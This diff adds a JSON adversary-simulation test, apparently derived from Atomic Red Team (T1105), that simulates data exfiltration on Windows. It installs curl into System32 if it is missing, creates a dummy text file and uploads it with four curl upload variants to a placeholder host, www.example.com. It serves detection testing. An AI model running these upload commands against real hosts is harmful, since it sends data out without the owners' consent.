@@ -1,0 +1,151 @@
+{
+  "id": "635c9a38-6cbf-47dc-8615-3810bc1167cf",
+  "name": "Curl Upload File",
+  "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "eb896092-fc89-4ad9-ba41-59fc1c345852",
+      "type": "execute-command",
+      "data": {
+        "command": "#{curl_path} -T #{file_path} #{remote_destination}\n#{curl_path} --upload-file #{file_path} #{remote_destination}\n#{curl_path} -d #{file_path} #{remote_destination}\n#{curl_path} --data #{file_path} #{remote_destination}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "275b6864-3940-49c9-9258-8da0a0839f69",
+      "name": "Check dependency 1/2",
+      "description": "Curl must be installed on system.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "147cda1c-c09e-46b1-82d6-fbd2e9359de4",
+      "name": "Resolve dependency 1/2",
+      "description": "Curl must be installed on system.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5e955ea3-074b-4688-aa3b-9200a3a5e3e1",
+      "name": "Re-check dependency 1/2",
+      "description": "Curl must be installed on system.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4ed619fc-6f8b-4f68-aa11-09727631bcd1",
+      "name": "Check dependency 2/2",
+      "description": "A file must be created to upload\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "2a775163-c2fb-4d31-a7f0-0b336919fd72",
+      "name": "Resolve dependency 2/2",
+      "description": "A file must be created to upload\n",
+      "type": "execute-command",
+      "data": {
+        "command": "echo \"This is an Atomic Test File\" \u003e #{file_path}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a17f002e-373f-4dc0-b20c-1c44ea68f874",
+      "name": "Re-check dependency 2/2",
+      "description": "A file must be created to upload\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "275b6864-3940-49c9-9258-8da0a0839f69",
+      "p": "on-success",
+      "o": "eb896092-fc89-4ad9-ba41-59fc1c345852"
+    },
+    {
+      "s": "275b6864-3940-49c9-9258-8da0a0839f69",
+      "p": "on-failure",
+      "o": "147cda1c-c09e-46b1-82d6-fbd2e9359de4"
+    },
+    {
+      "s": "147cda1c-c09e-46b1-82d6-fbd2e9359de4",
+      "p": "on-success",
+      "o": "5e955ea3-074b-4688-aa3b-9200a3a5e3e1"
+    },
+    {
+      "s": "5e955ea3-074b-4688-aa3b-9200a3a5e3e1",
+      "p": "on-failure",
+      "o": "eb896092-fc89-4ad9-ba41-59fc1c345852"
+    },
+    {
+      "s": "4ed619fc-6f8b-4f68-aa11-09727631bcd1",
+      "p": "on-success",
+      "o": "eb896092-fc89-4ad9-ba41-59fc1c345852"
+    },
+    {
+      "s": "4ed619fc-6f8b-4f68-aa11-09727631bcd1",
+      "p": "on-failure",
+      "o": "2a775163-c2fb-4d31-a7f0-0b336919fd72"
+    },
+    {
+      "s": "2a775163-c2fb-4d31-a7f0-0b336919fd72",
+      "p": "on-success",
+      "o": "a17f002e-373f-4dc0-b20c-1c44ea68f874"
+    },
+    {
+      "s": "a17f002e-373f-4dc0-b20c-1c44ea68f874",
+      "p": "on-failure",
+      "o": "eb896092-fc89-4ad9-ba41-59fc1c345852"
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "curl_path",
+      "type": "path",
+      "description": "path to curl.exe",
+      "value": "C:\\Windows\\System32\\Curl.exe"
+    },
+    {
+      "name": "remote_destination",
+      "type": "string",
+      "description": "Remote destination",
+      "value": "www.example.com"
+    },
+    {
+      "name": "file_path",
+      "type": "string",
+      "description": "File to upload",
+      "value": "c:\\temp\\atomictestfile.txt"
+    }
+  ]
+}
